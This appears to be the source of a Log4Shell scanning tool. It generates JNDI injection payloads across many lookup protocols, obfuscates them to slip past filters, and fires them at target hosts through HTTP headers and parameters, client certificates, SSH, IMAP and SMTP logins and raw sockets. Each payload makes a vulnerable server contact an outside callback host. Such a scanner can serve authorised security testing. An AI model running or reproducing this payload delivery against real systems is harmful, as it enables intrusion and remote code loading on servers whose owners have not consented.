import asyncio
from asyncio.tasks import Task
import logging
import random
import smtplib
import socket
import string
from enum import Enum
from smtplib import SMTP
from urllib.parse import urlparse
from queue import Queue

import httpx
from imap_tools import MailBox
from paramiko import SSHClient
from paramiko.client import WarningPolicy

from utils import generate_client_cert

HEADERS = [
    "Referer",
    "X-Api-Version",
    "Accept",
    "User-Agent",
    "X-Forwarded-For",
    "Origin",
    "Cookie",
    "Accept-Encoding",
    "Accept-Language",
]

POST_BODY_PARAMETERS = [
    'username',
    'user',
    'email',
    'account',
    'password',
    'name',
    'message'
]

DEFAULT_HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36",
}


PAYLOAD_PROTOCOLS = [
    "dns", "ldap", "ldaps", "rmi", "http", "corba", "iiop", "nis", "nds"
]

OBFUSCATIONS = [
    r"[CHAR]", r"${::-[CHAR]}", r"${lower:[CHAR]}", r"${upper:[CHAR]}"
]


class BaseScanner:
    obfuscate_payloads = True
    request_path = None
    path_to_clientcert = None
    include_bypass = False
    targets = Queue()

    def __init__(self, targets: list, obfuscate_payloads: bool, request_path: str, include_bypass: bool, path_to_clientcert: str = None) -> None:
        self.obfuscate_payloads = obfuscate_payloads
        self.request_path = request_path
        self.include_bypass = include_bypass
        self.path_to_clientcert = path_to_clientcert
        for target in targets:
            self.targets.put_nowait(target)

    def get_request_path(self, choose_random_path):
        if choose_random_path or self.request_path is None:
            target_path = ''.join(random.choice(string.ascii_lowercase) for _ in range(6))
        else:
            target_path = self.request_path
        return target_path

    def _obfuscate_string(self, to_obfuscate: str) -> str:
        out = []
        for char in to_obfuscate:
            obfuscation: str = random.choice(OBFUSCATIONS)
            if "${" in obfuscation and "${::" not in obfuscation:
                obfuscation = obfuscation.replace("[CHAR]", random.choice(OBFUSCATIONS))
            out.append(obfuscation.replace("[CHAR]", char))
        return "".join(out)

    def create_payload(
        self, callback_url: str, protocol: str,
        test_path: str, test_domain: str = None,
        include_domain: bool = True, include_bypass: bool = False
    ) -> str:
        format_str = "${{{jndi}:{protocol}://{bypass}{target_callback}/{path}}}"

        if include_domain:
            target = f"{test_domain}.{callback_url}"
        else:
            target = callback_url
        return format_str.format(
            jndi=(self._obfuscate_string("jndi") if self.obfuscate_payloads else "jndi"),
            protocol=(self._obfuscate_string(protocol) if self.obfuscate_payloads else protocol),
            bypass="127.0.0.1#" if include_bypass else "",
            target_callback=target,
            path=test_path
        )

    def run_tests(self, callback_domain: str, is_domain_in_callback: bool, use_random_request_path: bool):
        raise NotImplementedError("Use a subclass to run tests.")


class HttpScanner(BaseScanner):
    proxy = None

    class InjectionPointType(Enum):
        Header = "header"
        GetParam = "get"
        PostParam = "post"

    def __init__(self, targets: list, obfuscate_payloads: bool, request_path: str, include_bypass: bool, path_to_clientcert: str, proxy: str, generate_clientcert: bool, all_in_one: bool) -> None:
        super().__init__(targets, obfuscate_payloads, request_path, include_bypass, path_to_clientcert)
        self.generate_clientcert = generate_clientcert
        self.proxy = proxy
        self.all_in_one = all_in_one

    async def send_requests(self, client: httpx.AsyncClient, url: str, headers: dict, get_params: dict, post_params: dict) -> None:
        opened_requests = []
        try:
            if get_params or headers != DEFAULT_HEADERS:
                logging.debug("Sending GET")
                opened_requests.append(
                    client.get(
                        url,
                        params=get_params,
                        headers=headers,
                        timeout=3,
                    )
                )
                if get_params:
                    query_string = '&'.join(
                        [
                            f"{key}={value}" for key, value in get_params.items()
                        ]
                    )
                    opened_requests.append(
                        client.get(
                            f"{url}?{query_string}",
                            headers=headers,
                            timeout=3,
                        )
                    )
            if post_params or headers != DEFAULT_HEADERS:
                logging.debug("Sending POST as Form")
                opened_requests.append(
                    client.post(
                        url,
                        params=get_params,
                        headers=headers,
                        data=post_params,
                        timeout=3,
                    )
                )
                logging.debug("Sending POST as JSON")
                opened_requests.append(
                    client.post(
                        url,
                        params=get_params,
                        headers=headers,
                        json=post_params,
                        timeout=3,
                    ),
                )
        except Exception as excep:
            logging.exception(excep)
        for request in opened_requests:
            try:
                resp: httpx.Response = await request
                logging.debug(f"{resp.status_code}: {resp.reason_phrase}")
            except (httpx.ConnectTimeout, httpx.ReadTimeout):
                pass
            except Exception as excep:
                logging.exception(excep)

    async def test_injection(self, callback_host: str, url: str, is_domain_in_callback: bool = True, choose_random_path: bool = True):
        logging.info(f"Testing injection with {callback_host} for {url}")

        target_path = self.get_request_path(choose_random_path)

        for protocol in PAYLOAD_PROTOCOLS:
            logging.info(f"Testing the {protocol} protocol handler.")
            payload = self.create_payload(
                callback_host, protocol,
                target_path, urlparse(url).netloc,
                is_domain_in_callback, self.include_bypass
            )
            logging.debug(f"Using payload: {payload}")
            params = {
                "q": payload,
                "t": payload.replace("{", r"%7B").replace("}", r"%7D")
            }
            data = {
                key: payload for key in POST_BODY_PARAMETERS
            }
            headers_to_inject = {
                header_name: f'"{payload}"' if "Cookie" != header_name else f'session="{payload}"' for header_name in HEADERS
            }

            headers = DEFAULT_HEADERS.copy()
            headers.update(headers_to_inject)
            # logging.debug(f"Sending request with headers: {headers}")
            async with httpx.AsyncClient(
                verify=False,
                proxies=self.proxy,
                follow_redirects=True,
                max_redirects=3,
                cert=self.path_to_clientcert,
            ) as client:
                await self.send_requests(client, url, headers, params, data)

    async def test_injection_point(self, injection_type: InjectionPointType, callback_host: str, url: str, is_domain_in_callback: bool = True, choose_random_path: bool = True):
        logging.info(f"Testing injection in {injection_type.value} with {callback_host} for {url}")

        target_path = self.get_request_path(choose_random_path)

        for protocol in PAYLOAD_PROTOCOLS:
            logging.info(f"Testing the {protocol} protocol handler.")
            payload = self.create_payload(
                callback_host, protocol,
                target_path, urlparse(url).netloc,
                is_domain_in_callback, self.include_bypass
            )
            logging.debug(f"Using payload: {payload}")
            if injection_type == self.InjectionPointType.GetParam:
                params = {
                    "q": payload,
                    "t": payload.replace("{", r"%7B").replace("}", r"%7D")
                }
            else:
                params = None
            if injection_type == self.InjectionPointType.PostParam:
                data = {
                    key: payload for key in POST_BODY_PARAMETERS
                }
            else:
                data = None
            if injection_type == self.InjectionPointType.Header:
                headers_to_inject = [
                    {header_name: f'"{payload}"' if "Cookie" != header_name else f'session="{payload}"'} for header_name in HEADERS
                ]
            else:
                headers_to_inject = [DEFAULT_HEADERS.copy()]

            for header in headers_to_inject:
                headers = DEFAULT_HEADERS.copy()
                headers.update(header)
                # logging.debug(f"Sending request with headers: {headers}")
                async with httpx.AsyncClient(
                    verify=False,
                    proxies=self.proxy,
                    follow_redirects=True,
                    max_redirects=3,
                    cert=self.path_to_clientcert,
                ) as client:
                    await self.send_requests(client, url, headers, params, data)

    async def run_test_of_target(self, url: str, callback: str, domain_in_callback: bool = True, has_random_request_path: bool = True):
        try:
            if self.all_in_one:
                await self.test_injection(callback, url, domain_in_callback, has_random_request_path)
            else:
                for injection_type in self.InjectionPointType:
                    await self.test_injection_point(injection_type, callback, url, domain_in_callback, has_random_request_path)
        except Exception as excep:
            logging.exception(str(excep))

    async def test_all_injection_points(self, callback_domain: str, is_domain_in_callback: bool, use_random_request_path: bool):
        tasks: list[Task] = []
        while self.targets.qsize() > 0:
            target = self.targets.get_nowait()
            tasks.append(
                asyncio.create_task(
                    self.run_test_of_target(
                        target, callback_domain, not is_domain_in_callback, use_random_request_path
                    )
                )
            )
        for task in tasks:
            await task

    def run_tests(self, callback_domain: str, is_domain_in_callback: bool, use_random_request_path: bool):
        if self.generate_clientcert and not self.path_to_clientcert:
            payload = self.create_payload(
                callback_domain, "dns",
                self.get_request_path(use_random_request_path),
                "certificate",
                is_domain_in_callback,
                self.include_bypass
            )
            generate_client_cert(
                emailAddress=f"{smtplib.quoteaddr(payload)}@gmail.com",
                commonName=payload,
                subjectAltName=[f"DNS:{payload}"],
            )
            self.path_to_clientcert = "./injection.pem"
        asyncio.run(
            self.test_all_injection_points(
                callback_domain, is_domain_in_callback, use_random_request_path
            )
        )


class SshScanner(BaseScanner):

    def __init__(self, targets: list, obfuscate_payloads: bool, request_path: str, include_bypass: bool, path_to_clientcert: str = None) -> None:
        super().__init__(targets, obfuscate_payloads, request_path, include_bypass, path_to_clientcert)
        self._client = SSHClient()
        self._client.set_missing_host_key_policy(WarningPolicy)

    def run_tests(self, callback_domain: str, is_domain_in_callback: bool, use_random_request_path: bool):
        while self.targets.qsize() != 0:
            target = self.targets.get()
            if ":" in target:
                hostname, port = target.split(':')
            else:
                hostname = target
                port = 22
            logging.info(f"Checking {hostname} on port {port} over SSH.")
            for protocol in PAYLOAD_PROTOCOLS:
                payload = self.create_payload(
                    callback_domain, protocol,
                    self.get_request_path(use_random_request_path),
                    target,
                    is_domain_in_callback,
                    self.include_bypass
                )
                try:
                    self._client.connect(hostname=hostname, port=port, username=payload, password=payload, timeout=3, look_for_keys=False, auth_timeout=2)
                    self._client.close()
                except Exception as e:
                    logging.debug(e)
                if self.path_to_clientcert:
                    try:
                        self._client.connect(hostname=hostname, port=port, username=payload, key_filename=self.path_to_clientcert, timeout=3, look_for_keys=False, auth_timeout=2)
                        self._client.close()
                    except Exception as e:
                        logging.debug(e)


class ImapScanner(BaseScanner):

    def __init__(self, targets: list, obfuscate_payloads: bool, request_path: str, include_bypass: bool) -> None:
        super().__init__(targets, obfuscate_payloads, request_path, include_bypass)

    def run_tests(self, callback_domain: str, is_domain_in_callback: bool, use_random_request_path: bool):
        while self.targets.qsize() != 0:
            target = self.targets.get()
            if ":" in target:
                hostname, port = target.split(':')
            else:
                hostname = target
                port = 993
            logging.info(f"Checking {hostname} on port {port} over IMAP.")
            for protocol in PAYLOAD_PROTOCOLS:
                payload = self.create_payload(
                    callback_domain, protocol,
                    self.get_request_path(use_random_request_path),
                    target,
                    is_domain_in_callback,
                    self.include_bypass
                )
                try:
                    mailbox = MailBox(hostname, port=port)
                    mailbox.login(payload, payload, initial_folder=payload)
                    mailbox.logout()
                except Exception as e:
                    logging.debug(e)


class SmtpScanner(BaseScanner):

    def __init__(self, targets: list, obfuscate_payloads: bool, request_path: str, include_bypass: bool, local_hostname: str) -> None:
        super().__init__(targets, obfuscate_payloads, request_path, include_bypass)
        self._local_hostname = local_hostname

    def run_tests(self, callback_domain: str, is_domain_in_callback: bool, use_random_request_path: bool):
        while self.targets.qsize() != 0:
            target = self.targets.get()
            if ":" in target:
                hostname, port = target.split(':')
            else:
                hostname = target
                port = 25
            logging.info(f"Checking {hostname} on port {port} over SMTP.")
            for protocol in PAYLOAD_PROTOCOLS:
                payload = self.create_payload(
                    callback_domain, protocol,
                    self.get_request_path(use_random_request_path),
                    target,
                    is_domain_in_callback,
                    self.include_bypass
                )
                try:
                    with SMTP(host=hostname, port=port, local_hostname=self._local_hostname) as smtp:
                        smtp.login(payload, payload)
                except Exception as e:
                    logging.debug(e)
                try:
                    with SMTP(host=hostname, port=port, local_hostname=self._local_hostname) as smtp:
                        smtp.sendmail(f"{smtplib.quoteaddr(payload)}@test.com", f"{smtplib.quoteaddr(payload)}@{hostname}", smtplib.quotedata(payload))
                except Exception as e:
                    logging.debug(e)


class RawSocketScanner(BaseScanner):

    def __init__(self, targets: list, obfuscate_payloads: bool, request_path: str, include_bypass: bool) -> None:
        super().__init__(targets, obfuscate_payloads, request_path, include_bypass)

    def run_tests(self, callback_domain: str, is_domain_in_callback: bool, use_random_request_path: bool):
        while self.targets.qsize() != 0:
            target = self.targets.get()
            if ":" in target:
                hostname, port = target.split(':')
                port = int(port)
            else:
                hostname = target
                port = 80
            logging.info(f"Checking {hostname} on port {port} over raw sockets.")
            for protocol in PAYLOAD_PROTOCOLS:
                payload = self.create_payload(
                    callback_domain, protocol,
                    self.get_request_path(use_random_request_path),
                    target,
                    is_domain_in_callback,
                    self.include_bypass
                )
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                try:
                    s.connect((hostname, port))
                    s.send(payload.encode())
                except socket.error as e:
                    logging.debug(e)
                finally:
                    s.close()
